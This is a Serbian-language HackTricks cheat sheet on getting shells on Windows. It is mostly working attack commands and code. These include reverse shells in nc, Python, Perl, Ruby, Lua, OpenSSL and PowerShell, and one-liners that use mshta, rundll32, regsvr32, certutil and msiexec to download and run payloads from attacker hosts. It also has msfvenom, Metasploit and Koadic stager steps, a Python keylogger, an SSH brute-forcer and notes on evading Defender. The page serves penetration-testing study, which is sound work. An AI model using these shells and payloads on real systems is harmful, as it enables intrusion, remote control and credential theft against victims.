# Shells - Windows

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretnje, pronalazi probleme u celokupnom tehnološkom sklopu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

Stranica [lolbas-project.github.io](https://lolbas-project.github.io/) je za Windows ono što je [https://gtfobins.github.io/](https://gtfobins.github.io/) za linux.\
Očigledno, **nema SUID fajlova ili sudo privilegija u Windows-u**, ali korisno je znati **kako** neki **binarni fajlovi** mogu biti (zlo)upotrebljeni za izvršavanje nekih neočekivanih radnji kao što je **izvršavanje proizvoljnog koda**.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) je prenosiva i sigurna alternativa za Netcat**. Radi na Unix-sličnim sistemima i Win32. Sa funkcijama kao što su jaka enkripcija, izvršavanje programa, prilagodljivi izvorni portovi i kontinuirano ponovno povezivanje, sbd pruža raznovrsno rešenje za TCP/IP komunikaciju. Za korisnike Windows-a, verzija sbd.exe iz Kali Linux distribucije može se koristiti kao pouzdana zamena za Netcat.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python

Python je popularan programski jezik koji se često koristi u različitim oblastima, uključujući i hakovanje. Ovde su neke osnovne tehnike koje možete koristiti u Pythonu za hakovanje Windows sistema.

### Reverse Shell

Reverse shell je tehnika koja omogućava hakeru da preuzme kontrolu nad ciljanim Windows sistemom. U Pythonu, možete koristiti biblioteku `socket` za uspostavljanje veze sa ciljnim sistemom i izvršavanje komandi na njemu.

```python
import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("IP_ADRESA", PORT))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send(output.stdout.read())
        s.send(output.stderr.read())
    
    s.close()

connect()
```

### Keylogger

Keylogger je alat koji beleži sve unete tastere na ciljanom Windows sistemu. U Pythonu, možete koristiti biblioteku `pynput` za implementaciju keyloggera.

```python
from pynput.keyboard import Listener

def on_press(key):
    with open("log.txt", "a") as f:
        f.write(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
```

### Brute Force

Brute force je tehnika koja se koristi za pokušaj pronalaženja lozinke ili ključa metodom isprobavanja svih mogućih kombinacija. U Pythonu, možete koristiti biblioteku `paramiko` za izvršavanje brute force napada na SSH server.

```python
import paramiko

def brute_force_ssh(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(ip, username=username, password=password)
        print(f"Uspesno pronadjena lozinka: {password}")
    except paramiko.AuthenticationException:
        print(f"Neuspesno pronadjena lozinka: {password}")
    except paramiko.SSHException as e:
        print(f"Greška prilikom uspostavljanja SSH veze: {e}")
    finally:
        client.close()

brute_force_ssh("IP_ADRESA", "korisnicko_ime", "lozinka")
```

Ovo su samo neke od osnovnih tehnika koje možete koristiti u Pythonu za hakovanje Windows sistema. Python pruža mnoge druge mogućnosti i biblioteke koje vam mogu pomoći u izvršavanju različitih hakeraških zadataka.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl je popularan jezik za skriptiranje koji se često koristi u svetu hakovanja. Ovde su neki korisni Perl alati i tehnike koje možete koristiti prilikom testiranja bezbednosti Windows sistema.

### Reverse Shell sa Perlom

```perl
use Socket;
use FileHandle;

$ip = '127.0.0.1';
$port = 1234;

$proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, sockaddr_in($port, inet_aton($ip))) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
exec('/bin/sh -i');
```

### Bind Shell sa Perlom

```perl
use Socket;
use FileHandle;

$port = 1234;

$proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
setsockopt(SOCKET, SOL_SOCKET, SO_REUSEADDR, 1) or die "setsockopt: $!";
bind(SOCKET, sockaddr_in($port, INADDR_ANY)) or die "bind: $!";
listen(SOCKET, SOMAXCONN) or die "listen: $!";
$client_addr = accept(NEW_SOCKET, SOCKET);
open(STDIN, ">&NEW_SOCKET");
open(STDOUT, ">&NEW_SOCKET");
open(STDERR, ">&NEW_SOCKET");
exec('/bin/sh -i');
```

### Upotreba Perl skripti

Da biste izvršili Perl skriptu, možete koristiti sledeću komandu:

```bash
perl ime_skripte.pl
```

### Korisni Perl moduli

Perl ima mnogo korisnih modula koji mogu biti od pomoći prilikom hakovanja Windows sistema. Evo nekoliko popularnih modula:

- `Net::Ping` - Omogućava vam da proverite da li je određena IP adresa dostupna.
- `Net::SMTP` - Pruža funkcionalnost za slanje e-pošte putem SMTP protokola.
- `Win32::Registry` - Omogućava vam da pristupite i manipulišete Windows registrom.
- `Win32::API` - Pruža funkcionalnost za pozivanje Windows API funkcija iz Perl skripte.

Da biste instalirali ove module, možete koristiti CPAN (Comprehensive Perl Archive Network) komandu:

```bash
cpan Modul::Ime
```

### Korisni Perl alati

Pored Perl skripti, postoje i neki korisni Perl alati koji mogu biti od pomoći prilikom hakovanja Windows sistema. Evo nekoliko popularnih alata:

- `pl2bat` - Konvertuje Perl skriptu u izvršnu BAT datoteku.
- `perl2exe` - Pretvara Perl skriptu u izvršnu EXE datoteku.
- `Padre` - Integrisano razvojno okruženje (IDE) za Perl.
- `Perlfect` - Alat za pretragu i indeksiranje veb stranica.

Ovi alati mogu biti instalirani putem CPAN komande:

```bash
cpan Alat::Ime
```

### Zaključak

Perl je moćan jezik za skriptiranje koji može biti od velike pomoći prilikom hakovanja Windows sistema. Sa razumevanjem Perl-a i korišćenjem odgovarajućih alata i tehnika, možete efikasno testirati bezbednost sistema i pronalaziti ranjivosti.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby je dinamički programski jezik koji se često koristi za razvoj web aplikacija. Ima jednostavnu i čitljivu sintaksu, što ga čini popularnim izborom među programerima. Ruby takođe podržava objektno orijentisano programiranje i ima bogatu biblioteku koja olakšava razvoj softvera.

### Instalacija Ruby-ja

Da biste instalirali Ruby na Windows operativnom sistemu, možete koristiti RubyInstaller. Otvorite RubyInstaller stranicu i preuzmite najnoviju verziju Ruby-ja za Windows. Pokrenite preuzeti instalacioni program i pratite uputstva za instalaciju.

### Pokretanje Ruby skripti

Da biste pokrenuli Ruby skriptu, otvorite Command Prompt i unesite `ruby ime_skripte.rb`. Ruby interpreter će izvršiti skriptu i prikazati rezultate na ekranu.

### Korišćenje Ruby interaktivne konzole

Ruby takođe dolazi sa interaktivnom konzolom koja vam omogućava da izvršavate Ruby kod direktno u konzoli. Da biste pokrenuli interaktivnu konzolu, otvorite Command Prompt i unesite `irb`. Nakon toga možete unositi Ruby kod i videti rezultate odmah.

### Ruby gemovi

Ruby gemovi su biblioteke koje se koriste za proširenje funkcionalnosti Ruby-ja. Možete instalirati gemove pomoću `gem install ime_gema` komande. Nakon instalacije, možete koristiti gemove u svojim Ruby projektima.

### Primer Ruby skripte

```ruby
# Ovo je primer Ruby skripte koja ispisuje "Hello, World!" na ekranu
puts "Hello, World!"
```

Ova skripta koristi `puts` metodu za ispisivanje teksta na ekranu. Kada pokrenete ovu skriptu, videćete "Hello, World!" kao rezultat.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua je jednostavan, brz i fleksibilan jezik za programiranje koji se često koristi za pisanje skripti i proširenja u različitim aplikacijama. Lua je posebno popularna u svetu igara, gde se koristi za implementaciju igračkih logika i AI sistema.

### Pokretanje Lua skripti

Da biste pokrenuli Lua skriptu, prvo morate imati Lua interpreter instaliran na svom sistemu. Možete preuzeti Lua interpreter sa zvanične Lua veb stranice i instalirati ga prema uputstvima za vaš operativni sistem.

Kada imate Lua interpreter instaliran, možete pokrenuti skriptu tako što ćete je proslediti kao argument interpreteru. Na primer:

```bash
lua moj_skripta.lua
```

### Osnovni koncepti Lua jezika

Lua jezik ima nekoliko osnovnih koncepta koji su važni za razumevanje kako pisati efikasne Lua skripte. Evo nekoliko ključnih koncepta:

- **Promenljive**: Promenljive u Lua jeziku se deklarišu pomoću ključne reči `local`. Na primer, `local x = 10` deklariše lokalnu promenljivu `x` i dodeljuje joj vrednost 10.

- **Funkcije**: Funkcije u Lua jeziku se definišu pomoću ključne reči `function`. Na primer, `function add(a, b) return a + b end` definiše funkciju `add` koja vraća zbir dva broja.

- **Tabele**: Tabele u Lua jeziku su strukture podataka koje mogu sadržati vrednosti različitih tipova. Tabele se deklarišu pomoću vitičastih zagrada `{}`. Na primer, `local t = {name = "John", age = 30}` deklariše tabelu `t` sa poljima `name` i `age`.

- **Petlje**: Lua jezik podržava petlje `for` i `while` za iteriranje kroz kolekcije ili izvršavanje određenog koda dok je uslov ispunjen.

### Korisni resursi za učenje Lua jezika

Ako želite da naučite više o Lua jeziku, postoje mnogi korisni resursi dostupni na internetu. Evo nekoliko preporuka:

- **Zvanična Lua dokumentacija**: Zvanična Lua dokumentacija je odličan izvor informacija o jeziku i njegovim funkcionalnostima. Možete je pronaći na [zvaničnoj Lua veb stranici](https://www.lua.org/docs.html).

- **Lua korisnički vodič**: Lua korisnički vodič je detaljan tutorijal koji pokriva osnove Lua jezika i pruža praktične primere. Možete ga pronaći na [Lua korisničkom vodiču](https://www.lua.org/pil/contents.html).

- **Lua zajednica**: Lua zajednica je aktivna i podržava razmenu znanja i iskustava. Možete pronaći korisne informacije i resurse na [Lua zajednici](https://www.lua.org/community.html).

Sada kada imate osnovno razumevanje Lua jezika, možete početi da eksperimentišete sa pisanjem Lua skripti i istražujete njegove mogućnosti. Srećno programiranje!
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Napadač (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Žrtva
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell je moćan alat za automatizaciju i administraciju Windows sistema. Može se koristiti za izvršavanje skripti, upravljanje servisima, manipulaciju fajlovima i mnoge druge zadatke. Ovde su neke osnovne komande i tehnike koje možete koristiti u Powershell-u:

### Pokretanje Powershell-a

Da biste pokrenuli Powershell, otvorite Command Prompt i unesite `powershell`. Takođe možete desni klik na Start dugme i izabrati "Windows PowerShell".

### Izvršavanje skripti

Da biste izvršili Powershell skriptu, koristite komandu `.\ime_skripte.ps1`. Ovo će pokrenuti skriptu koja se nalazi u trenutnom direktorijumu.

### Prikazivanje sadržaja direktorijuma

Koristite komandu `Get-ChildItem` ili skraćeno `ls` da biste prikazali sadržaj trenutnog direktorijuma.

### Kreiranje direktorijuma

Koristite komandu `New-Item -ItemType Directory -Path "putanja_do_direktorijuma"` da biste kreirali novi direktorijum.

### Kopiranje fajlova

Koristite komandu `Copy-Item -Path "putanja_do_fajla" -Destination "putanja_do_destinacije"` da biste kopirali fajl na određenu destinaciju.

### Brisanje fajlova i direktorijuma

Koristite komandu `Remove-Item -Path "putanja_do_fajla_ili_direktorijuma"` da biste obrisali fajl ili direktorijum.

### Pokretanje programa

Koristite komandu `Start-Process -FilePath "putanja_do_programa"` da biste pokrenuli program.

### Prikazivanje informacija o sistemu

Koristite komandu `Get-WmiObject -Class Win32_ComputerSystem` da biste prikazali informacije o sistemu.

### Povezivanje na udaljeni računar

Koristite komandu `Enter-PSSession -ComputerName "ime_računara"` da biste se povezali na udaljeni računar.

### Automatizacija zadataka

Powershell vam omogućava da automatizujete zadatke pomoću skripti. Možete koristiti petlje, uslove i funkcije da biste izvršili složene zadatke.

Ovo su samo neke osnovne komande i tehnike koje možete koristiti u Powershell-u. Powershell ima mnogo više mogućnosti i funkcionalnosti koje možete istražiti kako biste postali još efikasniji u administraciji Windows sistema.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Proces koji vrši mrežni poziv: **powershell.exe**\
Payload zapisan na disku: **NE** (_barem nigde gde sam mogao da pronađem koristeći procmon!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Proces koji vrši mrežni poziv: **svchost.exe**\
Payload zapisan na disku: **Lokalni keš WebDAV klijenta**

**Jednolinijski kod:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Dobijte više informacija o različitim Powershell Shell-ovima na kraju ovog dokumenta**

## Mshta

* [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Primer hta-psh obrnutog školjka (koristi hta da preuzme i izvrši PS pozadinski ulaz)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Veoma lako možete preuzeti i izvršiti Koadic zombi koristeći stager hta**

#### Primer hta

[**Odavde**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Odavde**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta je izvršna datoteka koja se koristi za pokretanje HTML aplikacija na Windows operativnom sistemu. Metasploit je popularan alat za testiranje penetracije koji se često koristi za izvršavanje napada na ranjive sisteme. Metasploit ima modul koji omogućava izvršavanje zlonamernih skripti putem mshta.exe.

Da biste koristili mshta modul u Metasploitu, prvo morate da odaberete ciljni sistem i odgovarajući ranjivi softver. Zatim možete da koristite mshta modul za izvršavanje zlonamernih skripti na ciljnom sistemu.

Evo osnovne sintakse za korišćenje mshta modula u Metasploitu:

```
use exploit/windows/browser/mshta
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your IP address>
set LPORT <your port>
set URIPATH <URI path>
set SRVHOST <your IP address>
set SRVPORT <your port>
exploit
```

Nakon što izvršite ovu komandu, Metasploit će generisati zlonamernu HTML skriptu i pokrenuti je na ciljnom sistemu putem mshta.exe. Ovo vam omogućava da preuzmete kontrolu nad ciljnim sistemom i izvršavate različite napade.

Važno je napomenuti da je korišćenje mshta modula u Metasploitu ilegalno bez odobrenja vlasnika sistema. Ovaj modul treba koristiti samo u okviru zakonitih testiranja penetracije ili u obrazovne svrhe.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Otkriveno od strane zaštitnika**




## **Rundll32**

[**Primer Dll hello world**](https://github.com/carterjones/hello-world-dll)

* [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**Detektovano od strane defendera**

**Rundll32 - sct**

[**Odavde**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 je Windows alatka koja omogućava izvršavanje funkcija iz DLL fajlova. Metasploit ima modul koji omogućava izvršavanje zlonamernog koda putem Rundll32. Ovaj modul se koristi za postizanje udaljenog pristupa ciljnom sistemu i izvršavanje napadačevog koda. Da biste koristili ovaj modul, potrebno je da imate pristup Metasploit okruženju i da prilagodite payload koji želite da izvršite.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 je Windows alat koji omogućava izvršavanje funkcija iz DLL fajlova. Koadic je alat za daljinsko upravljanje koji koristi Rundll32 za izvršavanje zlonamernog koda na ciljnom sistemu.

Kako bi se koristio Koadic, potrebno je prvo preuzeti i pokrenuti njegovu PowerShell skriptu na ciljnom sistemu. Ova skripta će preuzeti DLL fajl koji sadrži zlonamerni kod i registruje ga kao COM objekat. Zatim, koristeći Rundll32, Koadic može da izvrši zlonamerni kod na ciljnom sistemu.

Koadic pruža različite funkcionalnosti za daljinsko upravljanje, kao što su preuzimanje i izvršavanje fajlova, snimanje tastature, presretanje ekrana i mnoge druge. Takođe, Koadic ima mogućnost da se sakrije od antivirusnih programa, što ga čini efikasnim alatom za napadače.

Kako bi se zaštitili od napada koji koriste Rundll32 i Koadic, preporučuje se redovno ažuriranje sistema i antivirusnog softvera, kao i korišćenje sigurnosnih mehanizama kao što su firewall-i i IDS/IPS sistemi. Takođe, važno je da korisnici budu obučeni o osnovnim principima bezbednosti i da budu oprezni prilikom otvaranja sumnjivih fajlova ili klikanja na sumnjive linkove.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

* [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Otkriveno od strane defendera**

#### Regsvr32 -sct

[**Odavde**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 je alat koji se koristi za registraciju i de-registraciju DLL fajlova u operativnom sistemu Windows. Međutim, ovaj alat može biti iskorišćen za izvršavanje zlonamernog koda na ciljnom sistemu.

Metasploit je popularan okvir za testiranje penetracije koji pruža različite module i eksploit kodove za iskorišćavanje ranjivosti. Metasploit takođe ima modul koji koristi Regsvr32 za izvršavanje zlonamernog koda na ciljnom sistemu.

Da biste iskoristili ovu tehniku, prvo morate generisati zlonamerni DLL fajl koji će biti registrovan pomoću Regsvr32. Zatim, koristite Metasploit modul koji će izvršiti zlonamerni kod kada se DLL fajl registruje.

Ova tehnika može biti korisna u situacijama kada je ciljni sistem ranjiv na Regsvr32 eksploataciju i kada imate pristup Metasploit okviru za izvršavanje napada.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Veoma lako možete preuzeti i izvršiti Koadic zombi koristeći stager regsvr**

## Certutil

* [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

Preuzmite B64dll, dekodirajte ga i izvršite.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Preuzmite B64exe, dekodirajte ga i izvršite.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Otkriveno od strane zaštitnika**

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivno skeniranje pretnji, pronalazi probleme u celokupnom tehnološkom sklopu, od API-ja do veb aplikacija i sistemima u oblaku. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Metasploit je popularan alat za testiranje penetracije koji se često koristi za iskorišćavanje ranjivosti u ciljanim sistemima. Cscript je jedan od načina za izvršavanje Metasploit modula na Windows operativnom sistemu.

Da biste koristili Cscript sa Metasploitom, prvo morate generisati Metasploit modul koji će biti izvršen. Ovo se može uraditi pomoću Metasploit Framework-a, koji je dostupan kao deo Metasploit-a.

Kada generišete Metasploit modul, možete ga izvršiti pomoću Cscript-a na ciljnom Windows sistemu. Cscript je Windows skriptni jezik koji se koristi za izvršavanje VBScript i JScript skriptova.

Da biste izvršili Metasploit modul pomoću Cscript-a, koristite sledeću komandu:

```
cscript //nologo <putanja_do_modula>
```

Ova komanda će izvršiti Metasploit modul bez prikazivanja logoa Cscript-a.

Kada izvršite Metasploit modul pomoću Cscript-a, možete dobiti pristup ciljnom sistemu i izvršavati različite komande i operacije.

Važno je napomenuti da je korišćenje Metasploit-a za bilo kakve neovlaštene aktivnosti ilegalno i može imati ozbiljne pravne posledice. Metasploit treba koristiti samo u okviru zakonskih i etičkih granica, kao deo testiranja penetracije ili za druge legitimne svrhe.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Otkriveno od strane zaštitnika**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Proces koji vrši mrežni poziv: **svchost.exe**\
Payload zapisan na disku: **Lokalni keš WebDAV klijenta**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Otkriveno od strane zaštitnika**

## **MSIExec**

Napadač
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Žrtva:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Detektovano**

## **Wmic**

